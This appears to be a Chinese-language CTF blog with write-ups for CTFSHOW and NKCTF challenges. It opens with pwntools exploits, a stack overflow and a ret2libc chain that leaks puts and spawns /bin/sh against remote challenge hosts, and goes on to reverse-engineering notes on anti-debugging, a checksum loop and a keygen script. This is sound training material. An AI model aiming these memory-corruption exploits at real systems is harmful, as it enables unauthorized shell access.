<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;111.231.70.44&quot;</span>,<span class="number">28010</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x9</span>+<span class="number">4</span>) + p32(<span class="number">0x0804850F</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="pwn03"><a href="#pwn03" class="headerlink" title="pwn03"></a>pwn03</h2><p>开了aslr保护，同时字符串并没有直接给出栈溢出的点 即<code>bin/sh</code>的字样，涉及到plt和got表，</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack1&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="string">&#x27;28300&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>+p32(puts_plt)+p32(main)+p32(puts_got)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">puts_add=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(puts_add)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_add)</span><br><span class="line">libcbase=puts_add-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_add=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>+p32(sys_add)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()                                                  </span><br></pre></td></tr></table></figure></div>

<h1 id="CTFSHOW-3月四周-20230320"><a href="#CTFSHOW-3月四周-20230320" class="headerlink" title="CTFSHOW-3月四周-20230320"></a>CTFSHOW-3月四周-20230320</h1><h2 id="武穆遗书"><a href="#武穆遗书" class="headerlink" title="武穆遗书"></a>武穆遗书</h2><p>fmf_my_reverse.exe<br>查壳upx先脱壳<code>upx -d [fileaddress]</code> 脱完后发现程序还是运行不了（程序是32位，所以无法在64位系统上运行）直接用ida反汇编<br>进入主函数发现使用了好多的api函数<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679286223360-32e3f38d-0e71-4928-98ba-37521fdc5499.png"
                      alt="image.png"
                ><br>分析一下这段代码</p>
<ol>
<li>调用三个未知函数sub_4011D0()、sub_401200()、sub_401280()</li>
<li>if判断，调用sub_401040()函数，如果函数返回值 !&#x3D;0，即执行exit(0)退出程序；</li>
<li>v4 &#x3D; (const char *)operator new(0x1Cu); 使用C++中operator new运算符动态分配内存，申请了一块内存大小是0x1C字节，返回的指针存储在v4中</li>
<li>sub_401390((int)v4, (int)v5, (int)&amp;unk_4070F4, 28)调用了sub_401390函数，将v4, v5, &amp;unk_4070F4, 28作为参数传递给函数</li>
<li>同2</li>
<li>进入while的无限循环，</li>
<li>gets(v6);观察下面的函数，知道gets函数从输入中读取用户输入的字符串，存储在v6中，gets函数存在缓冲区溢出的风险</li>
<li>fflush((FILE *)iob[0]._ptr);百度知道是为：清空输入缓冲区，防止缓冲区溢出</li>
<li>if ( !strcmp(v4, v6) )  break; 相等的话就跳出循环，否则输出密码错误的提示信息</li>
</ol>
<p> <code>printf(&quot;password error!!! please  try again!\nyour input is %s \n&quot;, v6);</code></p>
<ol start="10">
<li>跳出循环即输出成功信息<code>printf(&quot;win!!!the password and your input are all  %s\n&quot;, v6);</code>，并打印用户输入的密码</li>
<li>最后执行Command的系统命令</li>
</ol>
<p>下断点调试，老是会闪退，查了之后推测是用了反调试的手段</p>
<blockquote>
<p>其他反调试手段：</p>
<ol>
<li>检测调试器：软件会检测调试器的存在，并根据检测结果采取相应的行动，例如自我终止、运行不同的代码等。</li>
<li>检测断点：软件会检测是否在代码中设置了断点，如果检测到断点，可能会改变代码执行路径，或自我终止等。</li>
<li>检测调用栈：软件会检测调用栈，以查找是否存在调试器，如果存在，则可能会改变代码执行路径，或自我终止等。</li>
<li>加壳&#x2F;加密：软件加壳或加密后，使得调试器无法直接读取程序代码和数据，这样可以防止反汇编和调试。</li>
<li>虚拟化：软件会在虚拟机中运行，使得调试器无法直接访问真实的程序代码和数据，这样可以防止反汇编和调试。</li>
</ol>
</blockquote>
<p>大概有两种解法：<br>第一种就是nop掉程序中的exit后，程序动调就可以出flag<br>第二种attach the process，需要先把程序运行起来再选择才行，这个还是有点问题，改了程序的属性外加wow64文件夹，但发现程序还是会出现闪退的情况</p>
<h3 id="反汇编和反调试学习"><a href="#反汇编和反调试学习" class="headerlink" title="反汇编和反调试学习"></a>反汇编和反调试学习</h3><p>FS寄存器偏移值指向：<br>000 指向SEH链指针<br>004 线程堆栈顶部<br>008 线程堆栈底部<br>00C SubSystemTib<br>010 FiberData<br>014 ArbitraryUserPointer<br>018 FS段寄存器在内存中的镜像地址<br>020 进程PID<br>024 线程ID<br>02C 指向线程局部存储指针<br>030 PEB结构地址（进程结构）<br>034 上个错误号<br>原文链接：<a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1142065" >https://cloud.tencent.com/developer/article/1142065 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h1 id="CTFSHOW-3月三周-20230316"><a href="#CTFSHOW-3月三周-20230316" class="headerlink" title="CTFSHOW-3月三周-20230316"></a>CTFSHOW-3月三周-20230316</h1><h2 id="re3-20230316-17"><a href="#re3-20230316-17" class="headerlink" title="re3(20230316-17)"></a>re3(20230316-17)</h2><p>先看伪代码，发现逻辑是非常清晰的，定义v17长度是8的整型数组，经过for循环给v16赋值.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1678885012036-dff6e635-27d5-447f-84e9-09b8702cb95b.png"
                      alt="image.png"
                ></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  v7 = <span class="number">0x50</span>;</span><br><span class="line">  v8 = <span class="number">0xFAE3</span>;</span><br><span class="line">  v9 = <span class="number">0xD7D3F7B</span>;</span><br><span class="line">  v10 = <span class="number">0xA43499F6</span>;</span><br><span class="line">  v11 = <span class="number">5</span>;</span><br><span class="line">  v12 = <span class="number">0x10</span>;</span><br><span class="line">  v13 = <span class="number">0xEF9</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  puts(<span class="string">&quot;plz input the key:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  v3 = strlen(s);</span><br><span class="line">  strncpy(dest, v19, v3 - <span class="number">6</span>);</span><br><span class="line">  dest[strlen(s) - <span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  __isoc99_sscanf(dest, <span class="string">&quot;%x&quot;</span>, &amp;v5);</span><br><span class="line">  v17[<span class="number">0</span>] = v7;</span><br><span class="line">  v17[<span class="number">1</span>] = v8;</span><br><span class="line">  v17[<span class="number">2</span>] = v9;</span><br><span class="line">  v17[<span class="number">3</span>] = v10;</span><br><span class="line">  v17[<span class="number">4</span>] = (v11 &lt;&lt; <span class="number">12</span>) + v12;</span><br><span class="line">  v17[<span class="number">5</span>] = v13;</span><br><span class="line">  v17[<span class="number">6</span>] = v5;</span><br><span class="line">  v16 = 0LL;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( v16 += (unsigned <span class="built_in">int</span>)v17[i]; v16 &gt; <span class="number">0xFFFF</span>; v16 = v15 + (unsigned <span class="built_in">int</span>)(unsigned __int16)v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = (unsigned __int16)v16;</span><br><span class="line">      v15 = v16 &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> ( v16 == <span class="number">0xFFFF</span> )</span><br><span class="line">    puts(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    puts(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>需要得到的是输入的v5的值是什么四位数的值，v17数组最后一位是v5，暂且设置A是前面的得数 即A+v5&#x3D;&#x3D;0xFFFF返回“ok”。<br>一开始的时候我是直接将v17上面给的固定的值全部加了起来，最后发现这个数已经不是符合flag条件的4位数字了 所以肯定是哪边算错了<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1678885208244-d939b146-0f51-402c-98b7-d795f4b08f7a.png"
                      alt="image.png"
                ><br>后来发现for循环应该是一次一次的处理，v17[4]的值为0x5010，v17[5]的值为0xEF9，v17[6]的值是用户输入的数值。</p>
<blockquote>
<p>v17[4]&#x3D;0x5010 先将v11&#x3D;5（DEC）的值化成二进制的0101,&lt;&lt;左移12在低位补0 得到16进制的（v11&lt;&lt;12）的值即0x5000. v12&#x3D;0x10<br>v17[4]&#x3D;(v11&lt;&lt;12)+v12  &#x3D;&#x3D;&gt; 0x5000+0x10&#x3D;0x5010<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679035809354-e4f7ca1b-b090-48bf-9bd8-5df93a382bff.png"
                      alt="image.png"
                ></p>
</blockquote>
<p>每一次循环都将v16加上数组元素v17[i]的值，每轮循环结束后，将检查v16的值是否超过了16位的最大值0xFFFF。如果超过了，则将v16高16位（即进位）的值保存在v15中，并将v16的低16位截断，只保留其低16位的值。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">6</span>;++i)&#123;</span><br><span class="line">	<span class="keyword">for</span>(v16+= (unsigned <span class="built_in">int</span>)v17[i]; v16 &gt; <span class="number">0xFFFF</span>; v16 = v15 + (unsigned <span class="built_in">int</span>)(unsigned __int16)v16)</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = (unsigned __int16)v16;</span><br><span class="line">    v15 = v16 &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>都将v16加上数组元素v17[i]的值。在每轮循环结束后，将检查v16的值是否超过了16位的最大值0xFFFF。如果超过了，则将v16高16位的值保存在v15中，并将v16的低16位截断，只保留其低16位的值。<br>每一次运行的结果第一次循环：</p>
<ul>
<li>i &#x3D; 0</li>
<li>v17[0] &#x3D; 0x50</li>
<li>v16 &#x3D; 0 + 0x50 &#x3D; 0x50</li>
<li>v14 &#x3D; 0x50</li>
<li>v15 &#x3D; 0x00</li>
</ul>
<p>第二次循环：</p>
<ul>
<li>i &#x3D; 1</li>
<li>v17[1] &#x3D; 0xFAE3</li>
<li>v16 &#x3D; 0x50 + 0xFAE3 &#x3D; 0xFB33</li>
<li>v14 &#x3D; 0xFB33 &amp; 0xFFFF &#x3D; 0xB33</li>
<li>v15 &#x3D; 0xFB33 &gt;&gt; 16 &#x3D; 0x00</li>
</ul>
<p>第三次循环：</p>
<ul>
<li>i &#x3D; 2</li>
<li>v17[2] &#x3D; 0xD7D3F7B</li>
<li>v16 &#x3D; 0xFB33 + 0xD7D3F7B &#x3D; 0xD7D4EC0E</li>
<li>v14 &#x3D; 0xEC0E &amp; 0xFFFF &#x3D; 0xEC0E</li>
<li>v15 &#x3D; 0xD7D4 &amp; 0xFFFF &#x3D; 0xD7D4</li>
</ul>
<p>第四次循环：</p>
<ul>
<li>i &#x3D; 3</li>
<li>v17[3] &#x3D; 0xA43499F6</li>
<li>v16 &#x3D; 0xD7D4EC0E + 0xA43499F6 &#x3D; 0x7B09E904</li>
<li>v14 &#x3D; 0xE904 &amp; 0xFFFF &#x3D; 0xE904</li>
<li>v15 &#x3D; 0x7B09 &amp; 0xFFFF &#x3D; 0x7B09</li>
</ul>
<p>第五次循环：</p>
<ul>
<li>i &#x3D; 4</li>
<li>v17[4] &#x3D; (5 &lt;&lt; 12) + 0x10 &#x3D; 0x5010</li>
<li>v16 &#x3D; 0x7B09E904 + 0x5010 &#x3D; 0x7B09EE14</li>
<li>v14 &#x3D; 0xEE14 &amp; 0xFFFF &#x3D; 0xEE14</li>
<li>v15 &#x3D; 0x7B09 &amp; 0xFFFF &#x3D; 0x7B09</li>
</ul>
<p>第六次循环：</p>
<ul>
<li>i &#x3D; 5</li>
<li>v17[5] &#x3D; 0xEF9</li>
<li>v16 &#x3D; 0x7B09EE14 + 0xEF9 &#x3D; 0x7B09FD0D</li>
<li>v14 &#x3D; 0xFD0D &amp; 0xFFFF &#x3D; 0xFD0D</li>
<li>v15 &#x3D; 0x7B09 &amp; 0xFFFF &#x3D; 0x7B09</li>
</ul>
<p>第七次循环：</p>
<ul>
<li>i &#x3D; 6</li>
<li>v17[6] &#x3D; v5</li>
<li>v16 &#x3D; 0x7B09FD0D + v5</li>
</ul>
<p>最后逻辑崩盘，需要用动态调试搞一波，一开始写了一个C++脚本，</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> v17[<span class="number">8</span>] = &#123; <span class="number">0x50</span> ,<span class="number">0xFAE3</span>,<span class="number">0xD7D3F7B</span> ,<span class="number">0xA43499F6</span> ,<span class="number">0x5010</span> ,<span class="number">0xEF9</span> &#125;;</span><br><span class="line">    <span class="type">int</span> v14,v15,v16;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">6</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (v16 += (<span class="type">unsigned</span> <span class="type">int</span>)v17[i]; v16 &gt; <span class="number">0xFFFF</span>; v16 = v15 + (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="type">uint16_t</span>)v16)</span><br><span class="line">                &#123;</span><br><span class="line">                    v14 = (<span class="type">uint16_t</span>)v16;</span><br><span class="line">                    v15 = v16 &gt;&gt; <span class="number">16</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (v16 == <span class="number">0xFFFF</span>)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>发现存在报错的情况，逻辑上感觉没啥错误，像是操作不当的原因。<br>不过今天拓展了ubantu的gdb的界面<br>![0]]2I6&#96;M68H0NL14{9K~KKW.jpg](<a class="link"   target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/jpeg/23148330/1679066038125-c62305af-8599-43f5-920a-0d2cd122daa3.jpeg#averageHue=%23360e2d&clientId=u9a778dd9-a3b4-4&from=paste&height=945&id=u0bd99a6f&originHeight=945&originWidth=1470&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145816&status=done&style=none&taskId=uc38c23aa-33c4-4ba1-874d-aa7b5919727&title=&width=1470" >https://cdn.nlark.com/yuque/0/2023/jpeg/23148330/1679066038125-c62305af-8599-43f5-920a-0d2cd122daa3.jpeg#averageHue=%23360e2d&amp;clientId=u9a778dd9-a3b4-4&amp;from=paste&amp;height=945&amp;id=u0bd99a6f&amp;originHeight=945&amp;originWidth=1470&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=145816&amp;status=done&amp;style=none&amp;taskId=uc38c23aa-33c4-4ba1-874d-aa7b5919727&amp;title=&amp;width=1470 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>![Z7NWICH8I]6))BK)D_](OH6.jpg](<a class="link"   target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2023/jpeg/23148330/1679066054181-710e9645-46e5-49ea-8511-f6f29139b47c.jpeg#averageHue=%233f1c35&clientId=u9a778dd9-a3b4-4&from=paste&height=447&id=ue4024e80&originHeight=447&originWidth=833&originalType=binary&ratio=1&rotation=0&showTitle=false&size=96201&status=done&style=none&taskId=u30a1fabe-93f0-4141-9d55-2eff5179bed&title=&width=833" >https://cdn.nlark.com/yuque/0/2023/jpeg/23148330/1679066054181-710e9645-46e5-49ea-8511-f6f29139b47c.jpeg#averageHue=%233f1c35&amp;clientId=u9a778dd9-a3b4-4&amp;from=paste&amp;height=447&amp;id=ue4024e80&amp;originHeight=447&amp;originWidth=833&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=96201&amp;status=done&amp;style=none&amp;taskId=u30a1fabe-93f0-4141-9d55-2eff5179bed&amp;title=&amp;width=833 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>但貌似这个东西可以在ida里直接实现就好了，呜呜呜 准备明天去问问Pwn同学是咋搞的<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679155552698-9dad6849-b7d0-4e31-bf82-6e922e993327.png"
                      alt="image.png"
                ><br>一步一步跟进之后貌似发现了‘Error’的位置</p>
<h1 id="mingyue-exe-20230318"><a href="#mingyue-exe-20230318" class="headerlink" title="mingyue.exe(20230318)"></a>mingyue.exe(20230318)</h1><p>先关闭安全软件运行一个这个可执行文件，发现应该是有一串关于弹窗的代码出现，<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679124866042-5180b5d9-c2d9-4309-afa4-53a5489c2139.png"
                      alt="image.png"
                ><br>一般的会使用MessageBox的函数，这样的话，源代码应该是</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>,<span class="string">&quot;flag认证失败！&quot;</span>,<span class="string">&quot;师傅再接再励吧！&quot;</span>，MB_OK);</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>通过这个查找字符串的看是否存在与我们上面推测的弹窗的内容，可以看到有两段可疑字符和一个MessageBoxW的标志<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679125531025-a4c72ff8-745f-49e5-9a6e-0b281a509b0f.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679125482046-77c364f2-367a-4bc1-a779-60e2a1d1c8d8.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679130554161-64b9240b-583a-467d-9d5e-5a7545fab497.png"
                      alt="image.png"
                ><br>查看字符的地址与所在函数之后，查看主函数的逻辑<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679126259510-e569c16f-c993-4664-8bde-d1cd0afa84f0.png"
                      alt="image.png"
                ><br>貌似主函数看不出什么弹窗的源代码和提示flag的地方，突破口就是可以输入的地方sub_140001080函数，n一下将v3改为input 跟进一下函数，参数v3对应就是这里的char <em>a1，同改a1为input_num。a4890572163qwe函数就是我们刚刚发现的可以字符串的函数，n为string 整理一下函数和变量的名字。这段的代码就是给刚刚第一段的’)(</em>&amp;^%489$!057@#&gt;&lt;:2163qwe’进行加密的运算<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679133005708-6ad152b4-8443-4688-9f72-277060412ea3.png"
                      alt="image.png"
                ><br>其中两个重要的函数xor和judge函数</p>
<h3 id="xor函数的分析"><a href="#xor函数的分析" class="headerlink" title="xor函数的分析"></a>xor函数的分析</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679133581939-3fcaac42-ec7b-400a-ae6c-ab18721f5414.png"
                      alt="image.png"
                ><br>可以通过以下几个特征来看出这是一个链表节点<br>特征</p>
<ol>
<li>所占空间大小判定：内存块大小为 16 字节，一个链表节点通常需要存储两个指针，即指向下一个节点的指针和指向前一个节点的指针，每个指针通常需要占用 8 个字节的空间（在 64 位系统中），因此一个链表节点通常需要占用 16 个字节的空间。</li>
<li>特征函数判定：通过 malloc 函数分配内存块，这是链表节点动态内存分配的一种常见实现方式，因为链表节点数量通常不固定，所以需要动态分配内存来保存它们。</li>
<li>指针数组判定：通过一个指针数组来表示链表节点，返回值是一个指向 <strong>_QWORD</strong> 类型的指针，它指向了一个内存块，这个内存块的大小是 16 字节，即一个链表节点的大小。</li>
<li>通过将新分配的内存块的地址存储在全局变量中，将新节点插入链表的头部。这表明这是一个单向链表的实现方式。</li>
<li>内存块的第一个字节用来存储字符类型的值，这表明这个链表节点不仅包含指针，还包含数据。</li>
</ol>
<h3 id="judge函数的分析"><a href="#judge函数的分析" class="headerlink" title="judge函数的分析"></a>judge函数的分析</h3><p>改过之后的函数<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679151525094-72abd0f4-f580-4518-a268-530d67d5ba38.png"
                      alt="image.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1679151545151-66e1995c-fca6-4faf-a8d1-8674a12046f1.png#averageHue=%23fbfbfb&clientId=uf8617578-b3d4-4&from=paste&height=329&id=u3a277fd3&originHeight=329&originWidth=936&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15392&status=done&style=none&taskId=udb9a3083-83c1-4727-abb3-0414f34f5f1&title=&width=936"
                      alt="image.png"
                ><br>跟进最后两个函数，发现是两个我们上面猜测的弹窗的代码内容。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679144772466-2a1d9bae-3429-43e1-9eea-22a4194d4af3.png"
                      alt="image.png"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.nlark.com/yuque/0/2023/png/23148330/1679151607603-fc987ea8-8d6d-4d7e-8902-3ca0208557d5.png#averageHue=%23f6f5f5&clientId=uf8617578-b3d4-4&from=paste&height=118&id=u3d96c68c&originHeight=149&originWidth=408&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8606&status=done&style=none&taskId=ua1426408-8826-4a48-90ad-2ef526f7091&title=&width=322"
                      alt="image.png"
                ><br>最后脚本</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> table[<span class="number">27</span>] = <span class="string">&quot;)(*&amp;^%489$!057@#&gt;&lt;:2163qwe&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">XOR</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> ch)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">27</span>; i++)</span><br><span class="line">		<span class="keyword">if</span> (table[i] == ch) </span><br><span class="line">			<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> arr[<span class="number">15</span>] = <span class="string">&quot;/..v4p$$!&gt;Y59-&quot;</span>;</span><br><span class="line">	<span class="type">int</span> string[<span class="number">14</span>];</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		num *= <span class="number">26</span>;</span><br><span class="line">		string[i] = <span class="built_in">XOR</span>(arr[i] ^ <span class="number">7</span>);</span><br><span class="line">		num += string[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, num);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;<span class="number">2484524302484524302</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../Post_images/NKCTF-20230328.assets/1679153347949-a0a038cb-e35f-4208-9476-973520044f00.png"
                      alt="image.png"
